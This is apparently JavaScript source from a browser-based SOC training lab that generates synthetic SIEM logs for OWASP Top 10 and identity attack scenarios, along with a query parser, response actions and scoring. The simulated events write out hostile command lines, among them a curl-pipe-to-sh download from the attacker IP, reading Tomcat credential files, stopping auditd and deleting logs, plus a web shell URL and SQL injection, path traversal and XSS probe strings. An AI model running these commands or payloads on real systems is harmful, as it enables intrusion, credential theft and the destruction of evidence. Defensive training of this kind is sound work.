  story:`<b>${acct}</b> applied coupon <b>${code}</b> ${n} times; nothing in the design limited coupons to one use, so the cart dropped to 0 BDT and 3 laptops were ordered. No "hacking tool" was needed — it is a design flaw. Fix: threat-model business flows, server-side coupon limits, hold the order (Finance/Ops).`,
  tags:['OWASP A06:2025','CWE-840 Business Logic Errors','CWE-799 Improper Control of Interaction Frequency'],hints:['sourcetype=web uri=/api/cart/apply-coupon* | stats count by user','Check the msg field of /checkout']}}},
{id:'a07_stuff',cat:'OWASP',tag:'A07:2025 Authentication Failures',type:'Authentication failure — credential stuffing',name:'Credential stuffing on /login',
 desc:'Username/password pairs leaked from other sites are tried at scale from many IPs; with no rate limit or MFA, some accounts are taken over.',
 gen(c){const m=c.t(),ua='python-requests/2.31.0',ips=Array.from({length:25},()=>c.ip()),n=rnd(160,220),E=[];
  for(let i=0;i<n;i++)E.push(WEB(m+i*.05,{src_ip:pick(ips),method:'POST',uri:'/login',status:401,user:pick(['mahi','rony','shuvo','priya','anik','tuli','bappy','keya'])+rnd(10,999)+'@mail.example',user_agent:ua,bytes:120},1));
  const vic=[...CUST].sort(()=>R()-.5).slice(0,3);vic.forEach((v,i)=>{const ip=pick(ips);E.push(WEB(m+3+i*2,{src_ip:ip,method:'POST',uri:'/login',status:200,user:v.u,user_agent:ua},1));E.push(WEB(m+3.2+i*2,{src_ip:ip,uri:'/account/payment-methods',user:v.u,user_agent:ua},1))});
  return{events:E,questions:[{q:'Which user_agent did the attack tool use?',a:[ua,'python-requests']},{q:'How many accounts were successfully taken over? (number)',num:3,tol:0}],
  required:[['revoke_sessions',vic.map(v=>v.u)],['create_ticket','*']],recommended:[['notify','*']],intel:{},
  story:`${n}+ failed logins came from ${ips.length} different IPs (so per-IP rules stayed quiet) but all used <b>${ua}</b>. Three real customers (${vic.map(v=>v.u).join(', ')}) reused leaked passwords and were logged into, then the attacker opened their saved payment methods. Fix: MFA, rate limiting / bot protection, breached-password checks; force resets for the three.`,
  tags:['OWASP A07:2025','CWE-307 Improper Restriction of Excessive Auth Attempts','T1110.004 Credential Stuffing'],hints:['sourcetype=web uri=/login status=401 | stats count by user_agent','Same user_agent with status=200?']}}},
{id:'a08_deser',cat:'OWASP',tag:'A08:2025 Software or Data Integrity Failures',type:'Integrity failure — insecure deserialization',name:'Java deserialization RCE',
 desc:'The server trusts serialized objects sent by the client; a crafted object executes commands on the web server.',
 gen(c){const a=c.ip(),m=c.t(),E=[];for(let i=0;i<4;i++)E.push(WEB(m+i*.2,{src_ip:a,method:'POST',uri:'/api/session/restore',status:i<3?500:200,cookie:'SESSION=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa'+hex(12),user_agent:'Java/17.0.2'},1));
  const e=(d,cmd)=>E.push(ev(m+d,{sourcetype:'edr',event:'process_start',host:'SRV-WEB01',user:'tomcat',process:'sh',parent:'java',cmdline:cmd,hash:hex(64)},1));
  e(.9,'sh -c id');e(1.1,`sh -c curl -s http://${a}/s.sh | sh`);e(1.5,'sh -c cat /opt/tomcat/conf/tomcat-users.xml');
  E.push(ev(m+1.6,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:'10.0.2.10',dest_ip:a,dest_port:80,direction:'outbound',action:'allowed',bytes:rnd(4000,12000)},1));
  return{events:E,questions:[{q:'Which IP exploited the server?',a:[a]},{q:'Which account does the web server (and the shell) run as?',a:['tomcat']}],
  required:[['isolate_host',['SRV-WEB01','10.0.2.10']],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a]],
  intel:{[a]:'MALICIOUS — exploiting Java deserialization (ysoserial gadget chains).'},
  story:`${a} sent a Java serialized object (base64 starts with <b>rO0AB</b>) in the SESSION cookie to /api/session/restore. The app deserialized it without checking integrity, and <b>java</b> spawned <b>sh</b> as tomcat — remote code execution. Fix: never deserialize untrusted data; sign/verify session data; patch libraries.`,
  tags:['OWASP A08:2025','CWE-502 Deserialization of Untrusted Data','T1190 Exploit Public-Facing Application','T1059.004 Unix Shell'],hints:['sourcetype=edr host=SRV-WEB01 parent=java','Correlate the time with web requests to SRV-WEB01']}}},
{id:'a09_logs',cat:'OWASP',tag:'A09:2025 Security Logging & Alerting Failures',type:'Logging failure — log tampering',name:'Web shell + logs wiped',
 desc:'After getting in, the attacker deletes logs and stops auditing; the gap in logging hides what happened next.',
 gen(c){const a=c.ip(),m=rnd(45,75),shell='/uploads/img_'+rnd(1000,9999)+'.php',E=[];
  E.push(WEB(m-1,{src_ip:a,method:'POST',uri:'/api/profile/avatar',status:201,user:'cust_newbie',user_agent:UAS[0],msg:'uploaded '+shell.split('/').pop()},1));
  E.push(WEB(m,{src_ip:a,uri:shell+'?cmd=id',user_agent:UAS[0]},1));
  const e=(d,p,cmd)=>E.push(ev(m+d,{sourcetype:'edr',event:'process_start',host:'SRV-WEB01',user:'www-data',process:p,parent:'php-fpm',cmdline:cmd,hash:hex(64)},1));
  e(.2,'sh','id');e(1,'sh','sudo systemctl stop auditd');e(1.3,'sh','rm -f /var/log/nginx/access.log /var/log/nginx/error.log');e(1.5,'sh','history -c');
  const cut=m+1.3;return{events:E,drop:x=>x.sourcetype==='web'&&x._time>T(cut),questions:[{q:'What time (HH:MM) did SRV-WEB01 web logs stop?',time:cut},{q:'What is the web shell file name?',a:[shell,shell.split('/').pop()]}],
  required:[['isolate_host',['SRV-WEB01','10.0.2.10']],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
  intel:{[a]:'MALICIOUS — web-shell operator infrastructure.'},
  story:`${a} uploaded a PHP file disguised as an avatar (<b>${shell}</b>) and used it to run commands as www-data, then stopped auditd and deleted the nginx logs at <b>${fmtT(T(cut)).slice(0,5)}</b> — after that the SIEM sees nothing from the web server. Fix: ship logs off-host in real time, alert on missing log sources, validate uploads and never execute them.`,
  tags:['OWASP A09:2025','CWE-778 Insufficient Logging','T1070.002 Clear Linux Logs','T1505.003 Web Shell'],hints:['Look at the histogram for sourcetype=web — when does it go flat?','sourcetype=edr host=SRV-WEB01 parent=php-fpm']}}},
{id:'a10_except',cat:'OWASP',tag:'A10:2025 Mishandling of Exceptional Conditions',type:'Exceptional conditions — fail-open',name:'Auth error causes fail-open',
 desc:'Malformed input crashes the auth check; instead of failing closed, the app lets the request through and leaks stack traces.',
 gen(c){const a=c.ip(),m=c.t(),E=[];for(let i=0;i<rnd(30,45);i++)E.push(WEB(m+i*.05,{src_ip:a,method:'POST',uri:'/api/auth/verify',status:500,user_agent:'Go-http-client/1.1',msg:'java.lang.NullPointerException at AuthService.verify(AuthService.java:88)'},1));
  E.push(WEB(m+3,{src_ip:a,uri:'/admin/dashboard',user_agent:'Go-http-client/1.1',msg:'auth-service timeout: allowing request'},1));E.push(WEB(m+3.5,{src_ip:a,uri:'/admin/users/export',bytes:rnd(700000,950000),user_agent:'Go-http-client/1.1'},1));
  return{events:E,questions:[{q:'Which IP triggered the errors?',a:[a]},{q:'Which admin endpoint was used to export data?',a:['/admin/users/export']}],
  required:[['block_ip',a],['create_ticket','*'],['notify','*']],recommended:[['enrich_ip',a]],
  intel:{[a]:'SUSPICIOUS — fuzzing activity seen across several APIs.'},
  story:`${a} fuzzed /api/auth/verify with malformed JSON, causing ${'NullPointerException'}s (stack traces leaked in responses). While the auth service was failing, the gateway "failed open" and served <b>/admin/dashboard</b> and <b>/admin/users/export</b> to an anonymous user. New in 2025 as A10. Fix: fail closed, central exception handling, no stack traces to clients.`,
  tags:['OWASP A10:2025','CWE-636 Not Failing Securely','CWE-209 Error message info exposure'],hints:['sourcetype=web status=500 | stats count by src_ip','sourcetype=web uri=/admin* user=-']}}},
{id:'fp_pentest',cat:'OWASP',fp:true,tag:'Benign',type:'Authorised penetration test',name:'Authorised external pentest',
 desc:'Attack-looking traffic that is actually an approved penetration test — check announcements before blocking.',
 gen(c){const p=c.ip(),id='PT-2026-'+rnd(10,99),m=c.t(),E=[];E.push(ev(rnd(1,8),{sourcetype:'email',sender:'ciso@company.local',recipient:'soc@company.local',subject:`${id}: external web pentest by SecureAudit Ltd from ${p}, 09:00–13:00 today — do not block`,verdict:'delivered'}));
  ["1'+OR+'1'='1","1+UNION+SELECT+NULL--","../../etc/passwd","<script>alert(1)<\/script>"].forEach((x,i)=>E.push(WEB(m+i*.2,{src_ip:p,uri:'/products?id='+x,status:i?404:500,user_agent:'Mozilla/5.0 (pentest; SecureAudit)'})));
  for(let i=0;i<rnd(28,40);i++)E.push(WEB(m+1+i*.05,{src_ip:p,uri:'/scan'+rnd(1,999),status:404,bytes:0,user_agent:'Mozilla/5.0 (pentest; SecureAudit)'}));
  return{events:E,questions:[{q:'Which reference authorises this activity?',a:[id]},{q:'Source IP of the tester?',a:[p]}],
  required:[['close_case','*']],recommended:[],forbidden:[['block_ip',p]],intel:{[p]:'No reputation hits. Registered to SecureAudit Ltd (security consultancy).'},
  story:`The injection and scanning came from <b>${p}</b>, the approved pentester (<b>${id}</b>, announced by the CISO to soc@). Blocking it would break the test. Correct: verify the authorisation, document, close as false positive.`,tags:['Benign — authorised testing'],hints:['sourcetype=email | table _time, sender, subject']}}},
{id:'fp_crawler',cat:'OWASP',fp:true,tag:'Benign',type:'Search-engine crawler',name:'Googlebot 404 burst',
 desc:'A burst of 404s from a verified search-engine crawler following old links — noisy but harmless.',
 gen(c){const p='66.249.66.'+rnd(1,200),m=c.t(),E=[];for(let i=0;i<rnd(35,50);i++)E.push(WEB(m+i*.08,{src_ip:p,uri:'/old-shop/item-'+rnd(1,800)+'.html',status:404,bytes:0,user_agent:'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}));
  return{events:E,questions:[{q:'Which crawler produced the 404s?',a:['googlebot']}],required:[['close_case','*']],recommended:[['enrich_ip',p]],forbidden:[['block_ip',p]],
  intel:{[p]:'BENIGN — verified Googlebot (reverse DNS crawl-'+p.replace(/\./g,'-')+'.googlebot.com).'},
  story:`The 404 flood came from <b>${p}</b>, a verified Googlebot crawling old URLs from the previous shop version. Blocking it would hurt search ranking. Close as false positive; optionally ask web team to add redirects.`,tags:['Benign — crawler'],hints:['Enrich the IP before acting']}}},

/* ---------------- Identity ---------------- */
{id:'id_spray',cat:'Identity',tag:'Identity',type:'Password spray',name:'VPN password spray',
 desc:'One source tries one or two common passwords against many accounts to stay under lockout limits.',
 gen(c){const a=c.ip(),m=c.t(),v=c.user(),us=[...Object.keys(PEOPLE),'admin','administrator','test','j.smith','helpdesk','guest'].sort(()=>R()-.5),E=[];
  us.forEach((u,i)=>E.push(ev(m+i*.12,{sourcetype:'auth',event:'vpn_login',host:'VPN-GW01',user:u,src_ip:a,action:'failure',country:'NL',msg:'bad password'},1)));
  E.push(ev(m+us.length*.12+.5,{sourcetype:'auth',event:'vpn_login',host:'VPN-GW01',user:v,src_ip:a,action:'success',country:'NL'},1));
  return{events:E,questions:[{q:'Source IP of the spray?',a:[a]},{q:'Which account was compromised?',a:[v]}],
  required:[['block_ip',a],['reset_password',v]],recommended:[['disable_user',v],['enrich_ip',a],['revoke_sessions',v]],
  intel:{[a]:'MALICIOUS — password spraying against VPN gateways.'},
  story:`${a} tried a common password once against ${us.length} accounts in ~2 minutes (a <b>spray</b>, not brute force — so per-user lockouts never triggered), then got in as <b>${v}</b> on the VPN. Fix: MFA on VPN, banned-password list.`,
  tags:['T1110.003 Password Spraying','T1133 External Remote Services'],hints:['sourcetype=auth action=failure | stats dc(user) by src_ip','Any action=success from that IP?']}}},
{id:'id_travel',cat:'Identity',tag:'Identity',type:'Impossible travel — account takeover',name:'Impossible travel login',
 desc:'The same account logs in from two countries minutes apart — physically impossible, so one login is an attacker.',
 gen(c){const u=c.user(),p=PEOPLE[u],a=c.ip(),cc=pick(['US','BR','DE']),m=c.t(),E=[];
  E.push(ev(m,{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:p.ip,action:'success',country:'BD'},1));
  E.push(ev(m+rnd(8,14),{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:u,src_ip:a,action:'success',country:cc},1));
  E.push(ev(m+rnd(16,20),{sourcetype:'auth',event:'file_download',host:'SharePoint',user:u,src_ip:a,action:'success',country:cc,msg:'Downloaded '+rnd(150,400)+' files'},1));
  return{events:E,questions:[{q:'Which account was taken over?',a:[u]},{q:'From which country did the attacker log in?',a:[cc]}],
  required:[['revoke_sessions',u],['reset_password',u],['block_ip',a]],recommended:[['enrich_ip',a]],

function wild(v){return new RegExp('^'+v.replace(/[.+?^${}()|[\]\\]/g,'\\$&').replace(/\*/g,'.*')+'$','i')}

 case '>':return num&&na>nb;case '<':return num&&na<nb;case '>=':return num&&na>=nb;case '<=':return num&&na<=nb}return false}
function parseFilters(s){const toks=s.match(/[^\s"]*"[^"]*"|\S+/g)||[];const out=[];let neg=false;
 for(let t of toks){if(/^AND$/i.test(t))continue;if(/^OR$/i.test(t))throw new Error('OR is not supported in this lab — run two searches, or use wildcards like field=a*');
  if(/^NOT$/i.test(t)){neg=true;continue}

  if(m)c={f:m[1],op:m[2],v:m[3].replace(/^"|"$/g,'')};else c={text:t.replace(/^"|"$/g,'').replace(/\*/g,'').toLowerCase()};
  c.neg=neg;neg=false;out.push(c)}return out}
function evMatch(e,c){let r;if(c.f)r=cmp(e[c.f],c.op,c.v);else if(!c.text)r=true;else r=Object.keys(e).some(k=>k[0]!=='_'&&String(e[k]).toLowerCase().includes(c.text));return c.neg?!r:r}
function runQuery(q,events){const parts=q.split('|').map(s=>s.trim());const conds=parseFilters(parts[0]);
 let res={kind:'events',rows:events.filter(e=>conds.every(c=>evMatch(e,c))).sort((a,b)=>b._time-a._time)};
 for(const cmd of parts.slice(1)){if(!cmd)continue;let m;
  if(m=cmd.match(/^stats\s+(count|dc\((\w+)\)|sum\((\w+)\)|avg\((\w+)\))(?:\s+by\s+(.+))?$/i)){
   const agg=m[1].toLowerCase().startsWith('count')?'count':m[1].slice(0,m[1].indexOf('(')).toLowerCase(),af=m[2]||m[3]||m[4],by=m[5]?m[5].split(/[\s,]+/).filter(Boolean):[];

   const rows=[];for(const[k,evs]of g){const r={};by.forEach((f,i)=>r[f]=k.split('\u0001')[i]);
    if(agg==='count')r.count=evs.length;else if(agg==='dc')r.dc=new Set(evs.map(e=>e[af]).filter(v=>v!=null)).size;
    else{const s=evs.reduce((a,e)=>a+(Number(e[af])||0),0);r[agg]=agg==='avg'?Math.round(s/evs.length):s}
    r._events=evs;rows.push(r)}
   const col=agg;rows.sort((a,b)=>b[col]-a[col]);res={kind:'table',rows,cols:[...by,col],label:{[col]:m[1]}}}
  else if(m=cmd.match(/^where\s+(\w+)\s*(>=|<=|!=|=|>|<)\s*(\S+)$/i))res.rows=res.rows.filter(r=>cmp(r[m[1]],m[2],m[3]));
  else if(m=cmd.match(/^sort\s+(-?)(\w+)$/i)){const d=m[1]?-1:1,f=m[2];res.rows=[...res.rows].sort((a,b)=>{const x=a[f],y=b[f];return(typeof x==='number'&&typeof y==='number'?x-y:String(x??'').localeCompare(String(y??'')))*d})}
  else if(m=cmd.match(/^head\s+(\d+)$/i))res.rows=res.rows.slice(0,+m[1]);
  else if(m=cmd.match(/^table\s+(.+)$/i))res={kind:'table',rows:res.rows,cols:m[1].split(/[\s,]+/).filter(Boolean),label:res.label};
  else throw new Error('Unknown command: "'+cmd+'". Supported: stats, where, sort, head, table');}
 return res}

const ACTIONS={
 enrich_ip:{label:'Enrich IP (threat intel)',ph:'IP address',cat:'Investigate'},
 check_hash:{label:'Check file hash',ph:'SHA-256 hash',cat:'Investigate'},
 lookup_user:{label:'Look up user (directory)',ph:'username',cat:'Investigate'},
 block_ip:{label:'Block IP on firewall',ph:'IP address',cat:'Contain'},
 block_domain:{label:'Block domain (proxy + DNS)',ph:'domain',cat:'Contain'},
 isolate_host:{label:'Isolate host (EDR)',ph:'hostname or IP',cat:'Contain'},
 disable_user:{label:'Disable user account',ph:'username',cat:'Contain'},
 reset_password:{label:'Force password reset',ph:'username',cat:'Remediate'},
 revoke_sessions:{label:'Revoke sessions / tokens',ph:'username or account',cat:'Contain'},
 quarantine_email:{label:'Quarantine emails from sender',ph:'sender address or domain',cat:'Remediate'},
 restore_backup:{label:'Restore from clean backup',ph:'hostname',cat:'Remediate'},
 create_ticket:{label:'Create fix ticket (Dev / IT)',ph:'team: what to fix, e.g. Dev: parameterise SQL',cat:'Remediate'},
 notify:{label:'Notify team (Mgmt / HR / Legal)',ph:'who? e.g. HR, Legal',cat:'Communicate'},

const TEMPLATES={
 'Account compromise':['enrich_ip','block_ip','disable_user','reset_password','notify'],
 'Malware on endpoint':['check_hash','isolate_host','block_domain','block_ip','reset_password'],
 'Phishing response':['quarantine_email','block_domain','reset_password','enrich_ip'],
 'Data exfiltration':['lookup_user','block_domain','disable_user','notify'],
 'Web application attack':['enrich_ip','block_ip','revoke_sessions','create_ticket','notify'],
 'Ransomware':['isolate_host','disable_user','check_hash','restore_backup','notify'],
 'Benign / false positive':['enrich_ip','lookup_user','close_case']};
const isIP=s=>/^\d{1,3}(\.\d{1,3}){3}$/.test(s);
function execAction(a,p){const t=S.truth,P=p.trim(),pl=P.toLowerCase();if(!P)return['bad','✖ parameter required'];
 const intel=Object.keys(t.intel).find(k=>k.toLowerCase()===pl||(pl.length>=8&&k.toLowerCase().startsWith(pl)));
 switch(a){
  case 'enrich_ip':if(!isIP(P))return['bad','✖ not a valid IPv4 address'];if(intel)return[t.intel[intel].startsWith('MALICIOUS')||t.intel[intel].startsWith('SUSPICIOUS')?'warn':'info','↳ '+t.intel[intel]];
   if(ASSETS[P])return['info','↳ Internal asset: '+ASSETS[P]];if(P.startsWith('10.'))return['info','↳ Internal address, not in CMDB'];return['info','↳ No reputation hits. Looks like common cloud/CDN infrastructure.'];
  case 'check_hash':if(!/^[a-f0-9]{8,64}$/i.test(P))return['bad','✖ not a hex hash'];if(intel)return['warn','↳ '+t.intel[intel]];
   if(Object.values(PROC_HASH).some(h=>h.startsWith(pl)))return['info','↳ Known good — signed vendor binary (0/70)'];return['info','↳ Unknown file — 0/70 engines, never seen before'];
  case 'lookup_user':if(PEOPLE[pl]){const x=PEOPLE[pl];return['info',`↳ ${pl}: ${x.title}, ${x.dept} dept · workstation ${x.host} (${x.ip}) · MFA: enabled`]}if(SERVICE[pl])return['info','↳ '+SERVICE[pl]];if(knownUser(pl))return['warn','↳ '+P+': account exists but has no owner / department info (created recently?)'];return['bad','✖ user not found in directory'];
  case 'block_ip':if(!isIP(P))return['bad','✖ not a valid IPv4 address'];return[P.startsWith('10.')?'warn':'ok',`✔ FW-EDGE01: DENY any <-> ${P} (rule #${rnd(1000,9999)})`+(P.startsWith('10.')?'\n  ⚠ You blocked an INTERNAL address — business services may break.':'')];
  case 'block_domain':if(!/\./.test(P)||isIP(P))return['bad','✖ not a domain'];return['ok',`✔ Proxy category set to BLOCK and DNS sinkhole added for ${P}`];
  case 'isolate_host':return['ok',`✔ EDR network containment applied to ${P}. Host can only talk to the EDR console.`];
  case 'disable_user':if(!knownUser(pl))return['bad','✖ user not found in directory'];return['ok',`✔ Account ${P} disabled; active sessions & tokens revoked`];
  case 'reset_password':if(!knownUser(pl))return['bad','✖ user not found in directory'];return['ok',`✔ Password reset forced for ${P}; MFA re-registration required`];
  case 'revoke_sessions':return['ok',`✔ All web/app sessions and refresh tokens revoked for ${P}`];
  case 'restore_backup':return['ok',`✔ Restore of ${P} from last clean backup scheduled (after re-imaging)`];
  case 'create_ticket':return['ok',`✔ Ticket INC-${rnd(10000,99999)} created → ${P}`];
  case 'quarantine_email':{const n=S.events.filter(e=>e.sourcetype==='email'&&String(e.sender).toLowerCase().includes(pl)).length;return n?['ok',`✔ Purged ${n} message(s) from user mailboxes`]:['warn','↳ No messages matched that sender']}
  case 'notify':return['ok',`✔ Notification sent to: ${P}`];
  case 'close_case':return['ok',`✔ Case closed — reason: "${P}"`];}}

function knownUser(u){return !!(PEOPLE[u]||SERVICE[u]||(S&&S.events.some(e=>String(e.user).toLowerCase()===u||String(e.target_user).toLowerCase()===u)))}
function baseState(extra){return Object.assign({rules:DEFAULT_RULES.map(r=>({...r,on:true,builtin:true})),alerts:[],triage:{},cls:{},steps:[{a:'enrich_ip',p:''}],executed:[],log:[],answers:{},verdict:'',notes:'',hints:0,result:null,query:'',started:Date.now()},extra)}
function startMission(i){const sc=SCENARIOS[i],seed=(Date.now()%1e9)|0;R=mulberry32(seed);buildCustomers();
 const n=noise(420).concat(webNoise(180)),g=sc.gen();
 S=baseState({mode:'story',i,sc,seed,events:n.concat(g.events).sort((a,b)=>a._time-b._time),truth:g.truth});
 runDetections(true);show('alerts')}
/* multi-incident modes: 'owasp' | 'shift' | 'lib:<id>' */
const MODES={owasp:{id:'owasp',name:'OWASP Top 10 Web Day',brief:'You are watching shop.company.example (SRV-WEB01) today. Web, WAF-style, EDR and auth logs are in the SIEM. Several web-application attacks — and maybe a harmless look-alike — are hidden in them. Triage every alert, classify each real one by attack type, respond, then submit.'},
 shift:{id:'shift',name:'Random SOC Shift',brief:'A normal day on shift. Alerts from web, identity, endpoint, network and email are waiting — some are real incidents, some are false positives. Triage and classify every alert, respond to the real ones, and close the benign ones.'}};
function startMulti(mode){const seed=(Date.now()%1e9)|0;R=mulberry32(seed);buildCustomers();
 let defs;
 if(mode==='owasp'){const tp=INC.filter(x=>x.cat==='OWASP'&&!x.fp).sort(()=>R()-.5).slice(0,4);defs=R()<.6?tp.concat(pick(INC.filter(x=>x.cat==='OWASP'&&x.fp))):tp}
 else if(mode==='shift'){const tp=INC.filter(x=>!x.fp).sort(()=>R()-.5).slice(0,rnd(4,5));const fp=INC.filter(x=>x.fp).sort(()=>R()-.5).slice(0,rnd(1,2));defs=tp.concat(fp)}
 else defs=[INC.find(x=>x.id===mode.slice(4))];
 const usedIP=new Set(),usedU=new Set();
 const c={ip(){let ip;do{ip=pick(['203.0.113.','198.51.100.','192.0.2.'])+rnd(2,253)}while(usedIP.has(ip));usedIP.add(ip);return ip},
  user(list){const l=(list||Object.keys(PEOPLE)).filter(u=>!usedU.has(u));const u=pick(l.length?l:Object.keys(PEOPLE));usedU.add(u);return u},t:()=>rnd(12,80)};
 const incs=defs.map((d,k)=>{const g=d.gen(c);g.events.forEach(e=>e._inc=k);return{def:d,g}});
 let noiseEv=noise(420).concat(webNoise(180));incs.forEach(x=>{if(x.g.drop)noiseEv=noiseEv.filter(e=>!x.g.drop(e))});
 const intel={};incs.forEach(x=>Object.assign(intel,x.g.intel));
 const sc=mode.startsWith('lib:')?{id:mode,name:'Practice: '+defs[0].name,brief:defs[0].desc+' Investigate the alert(s), decide true or false positive, classify, respond and report.'}:MODES[mode];
 S=baseState({mode:'multi',key:mode,sc,seed,incs,events:noiseEv.concat(...incs.map(x=>x.g.events)).sort((a,b)=>a._time-b._time),truth:{intel}});
 runDetections(true);show('alerts')}
function restart(){if(S.mode==='story')startMission(S.i);else startMulti(S.key)}
function runDetections(silent){const out=[];for(const r of S.rules){if(!r.on)continue;let res;try{res=runQuery(r.q,S.events)}catch(e){r.err=e.message;continue}r.err='';
  if(res.kind==='events'){if(res.rows.length)out.push(mkAlert(r,{},res.rows,res.rows.length))}
  else res.rows.forEach(row=>{const by={};res.cols.slice(0,-1).forEach(c=>by[c]=row[c]);out.push(mkAlert(r,by,row._events||[],row[res.cols[res.cols.length-1]]))})}
 S.alerts=out.sort((a,b)=>a.first-b.first);updateStatus();if(!silent)render()}
function mkAlert(r,by,evs,metric){const times=evs.map(e=>e._time);const me=evs.find(e=>e._mal)||evs.find(e=>e._inc!=null);
 return{id:r.id+'|'+JSON.stringify(by),rule:r,by,metric,count:evs.length,first:Math.min(...times),last:Math.max(...times),mal:evs.some(e=>e._mal),inc:me?me._inc:null,builtin:!!r.builtin}}
function updateStatus(){$('#status').innerHTML=S?`<b style="color:var(--text)">${esc(S.sc.name)}</b> · case #${S.seed%10000}<br>${S.alerts.filter(a=>!S.triage[a.id]).length} untriaged alert(s)`:'No active mission';renderNav()}
const TYPES_BY_CAT=(()=>{const o={};INC.filter(x=>!x.fp).forEach(x=>{(o[x.cat]=o[x.cat]||[]);if(!o[x.cat].includes(x.type))o[x.cat].push(x.type)});return o})();

 <label class="small">Final verdict</label><div class="row" style="margin:4px 0 10px"><button class="btn ok ${S.verdict==='TP'?'sel':''}" onclick="S.verdict='TP';render()">True positive — real incident</button><button class="btn bad ${S.verdict==='FP'?'sel':''}" onclick="S.verdict='FP';render()">False positive — benign</button></div>
 <label class="small">Analyst notes (not scored — practise writing a summary)</label><textarea oninput="S.notes=this.value" placeholder="Timeline, root cause, actions taken, recommendations…">${esc(S.notes)}</textarea></div>
 <div class="card"><h2>Hints <span class="small muted">(−5 points each)</span></h2>${t.hints.slice(0,S.hints).map(h=>`<div class="hint">💡 ${esc(h)}</div>`).join('')}${S.hints<t.hints.length?`<button class="btn sm" onclick="S.hints++;render()">Reveal hint ${S.hints+1}/${t.hints.length}</button>`:''}</div>
 <div class="card"><p class="small muted">Before submitting: triaged all alerts? Ran your response playbook? (${S.alerts.filter(a=>!S.triage[a.id]).length} untriaged · ${S.executed.length} actions taken)</p><button class="btn pri" onclick="submitReport()">Submit report &amp; get score</button></div>`},

guide(){return `<div class="card"><h2>What are SIEM and SOAR?</h2><p><b>SIEM</b> (Security Information &amp; Event Management) collects logs from across the network into one place so analysts can search them and run <i>detection rules</i> that raise alerts — e.g. Splunk, Microsoft Sentinel, Elastic, Wazuh, QRadar.</p>
 <p><b>SOAR</b> (Security Orchestration, Automation &amp; Response) turns response steps into <i>playbooks</i> that run automatically across tools — enrich an IP, block it on the firewall, disable a user, isolate a laptop — e.g. Cortex XSOAR, Splunk SOAR, Shuffle, Tines.</p></div>
 <div class="card"><h2>Query syntax (mini-SPL)</h2><table>
 <tr><td>field=value</td><td>exact match, case-insensitive · <code>*</code> wildcard: <code>cmdline=*-enc*</code></td></tr>
 <tr><td>field!=value · NOT field=value</td><td>exclude</td></tr><tr><td>bytes&gt;1000000</td><td>numeric compare (&gt; &lt; &gt;= &lt;=)</td></tr>
 <tr><td>free text</td><td>any field contains it: <code>powershell</code></td></tr>
 <tr><td>| stats count by f1, f2</td><td>group &amp; count · also <code>dc(field)</code>, <code>sum(field)</code>, <code>avg(field)</code></td></tr>
 <tr><td>| where count &gt; 20</td><td>filter stats results (columns: count, dc, sum, avg)</td></tr>
 <tr><td>| sort -count · | head 10</td><td>sort (− = descending) · limit</td></tr><tr><td>| table _time, user, url</td><td>choose columns</td></tr></table>
 <p class="small muted">Terms are ANDed together. Tap a value under "Fields" in search results to add it as a filter.</p></div>
 <div class="card"><h2>Log sources</h2><table><tr><th>sourcetype</th><th>key fields</th></tr>
 <tr><td>auth</td><td>event, host, user, src_ip, action, country, target_user, group, service, encryption</td></tr><tr><td>firewall</td><td>src_ip, dest_ip, dest_port, direction, action, bytes</td></tr>
 <tr><td>proxy</td><td>user, domain, url, method, category, action, bytes</td></tr><tr><td>dns</td><td>host, src_ip, query, answer</td></tr>
 <tr><td>web</td><td>src_ip, method, uri, status, user, bytes, user_agent, scheme, response_ms, msg</td></tr><tr><td>edr</td><td>event, host, user, process, parent, cmdline, hash</td></tr><tr><td>email</td><td>sender, display_name, reply_to, recipient, subject, url, attachment</td></tr></table></div>
 <div class="card"><h2>OWASP Top 10:2025 in this lab</h2><table><tr><th>#</th><th>Category</th><th>Practice scenario(s)</th></tr>${[['A01','Broken Access Control (incl. SSRF)','a01_idor,a01_trav,a01_ssrf'],['A02','Security Misconfiguration','a02_misconf'],['A03','Software Supply Chain Failures','a03_supply'],['A04','Cryptographic Failures','a04_crypto'],['A05','Injection','a05_sqli,a05_xss'],['A06','Insecure Design','a06_design'],['A07','Authentication Failures','a07_stuff'],['A08','Software or Data Integrity Failures','a08_deser'],['A09','Security Logging & Alerting Failures','a09_logs'],['A10','Mishandling of Exceptional Conditions','a10_except']].map(([n,c,ids])=>`<tr><td>${n}</td><td>${c}</td><td>${ids.split(',').map(id=>{const x=INC.find(i=>i.id===id);return `<a href="#" style="color:var(--accent)" onclick="event.preventDefault();startMulti('lib:${id}')">${esc(x.name)}</a>`}).join('<br>')}</td></tr>`).join('')}</table>
 <p class="small muted">Web logs (sourcetype=web) come from SRV-WEB01 / shop.company.example. In real SOCs these come from the web server, reverse proxy or WAF.</p></div>
 <div class="card"><h2>Scoring</h2><p class="small">Investigation answers 10 each · correct verdict 20 (story missions) · each built-in alert triaged correctly 5 · each true-positive alert classified correctly 5 (random modes) · each required response action 10 · each recommended action 5 · harmful action −15 · blocking an internal IP −10 · each hint −5.</p></div>
 <div class="card"><h2>For instructors</h2><p class="small">Have students write a custom rule that would catch the attack earlier (e.g. outbound to port 4444, or emails with double-extension attachments), then justify each playbook step in their notes. Run "Noisy Neighbor" last — it tests whether students verify before blocking. Because every restart randomises the data, students can work the same mission side by side and still have different answers.</p></div>`}
};

const EXAMPLES=[['Events by source','| stats count by sourcetype'],['Web status codes','sourcetype=web | stats count by status'],['Web top URIs','sourcetype=web | stats count by uri | sort -count | head 15'],['Web clients','sourcetype=web | stats count by src_ip, user_agent | sort -count | head 15'],['Failed logins','sourcetype=auth action=failure | stats count by src_ip, user | sort -count'],['Top DNS queries','sourcetype=dns | stats count by query | sort -count | head 10'],['Outbound volume','sourcetype=firewall direction=outbound | stats sum(bytes) by src_ip | sort -sum | head 10'],['Processes','sourcetype=edr | table _time, host, user, process, parent, cmdline'],['Emails','sourcetype=email | table _time, sender, recipient, subject'],['Proxy categories','sourcetype=proxy | stats count by category']];
function setQ(i){S.query=EXAMPLES[i][1];$('#q').value=S.query;doSearch()}
function doSearch(keep){const q=$('#q');if(!q)return;S.query=q.value;if(!keep)LIMIT=100;const out=$('#res');
